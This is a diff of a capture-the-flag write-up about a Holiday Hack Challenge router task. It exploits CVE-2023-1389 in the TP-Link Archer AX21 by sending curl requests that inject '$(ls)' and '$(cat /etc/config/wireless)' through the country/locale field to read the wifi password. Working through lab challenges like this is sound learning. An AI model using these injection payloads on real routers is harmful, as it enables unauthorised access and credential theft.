@@ -15,7 +15,7 @@ Difficulty: ❄️❄️
 >-  **UCI:** You know...if my memory serves me correctly...there was a lot of fuss going on about a UCI (I forgot the exact term...) for that router.
 </details>
  
-#  
+#
 
 ## PROCEDURE : ##
 
@@ -23,15 +23,21 @@ At the 24-7 shop, Janusz tells us that the gnomes have somehow managed to change
 
 We are greeted by a login prompt asking us for a password.  The screen tells us that the Hardware version is AX21 v2.0.  If we follow the suggestion in the hint and search for "archer ax21 v2.0 uci vulnerability", the top result is a [statement issued by TP-Link](https://www.tp-link.com/us/support/faq/3643/) regarding a Remote Code execution Vulnerability **[CVE-2023-1389](https://www.exploit-db.com/exploits/51677)**.  This in turn points us to [this handy forum post](https://osintteam.blog/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94) which gives very detailed instructions on how to exploit the vulnerability.
 
-Armed with this information we can try to get the router to execute code remotely using the exploit.  First I got it to execute the `ls` command (note that the command has to be executed twice to give an output):
+Armed with this information we now know that the router's firmware is vulnerable to a Remote Code Execution (RCE) exploit through the `locale` variable.
 
+First of all, we can test to see that we are able to change the value of `locale` to any arbitrary value:
+```bash
+└─$ curl -k -X POST "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=TEST_STRING'
+{"data":{"country":"TEST_STRING"},"success":true}
 ```
-└─$ curl -k -X POST \
-  "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(ls)
+
+This appears to work, so now we can try to get the router to display some information about the files that are stored on it.  First I got it to execute the `ls` command.  The `curl` command is executed twice - the first time sets the value of the `locale` variable to the output of the `ls` command and the second time shows us that output:
+
+```bash
+└─$ curl -k -X POST "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(ls)'
 OK
 
-└─$ curl -k -X POST \
-  "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(ls)'
+└─$ curl -k -X POST "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(ls)'
 
 bin
 cgi-bin
@@ -52,12 +58,11 @@ var
 www
 ```
 
-Then it was simply a case of finding the config file for the wifi network and reading the password from it:
+Now, it's simply a case of finding the config file for the wifi network and reading the password from it:
 
-```
+```bash
 ┌──(test㉿KaliServer1)-[~]
-└─$ curl -k -X POST \
-  "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(cat /etc/config/wireless)'
+└─$ curl -k -X POST "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(cat /etc/config/wireless)'
 
 ...
 ...
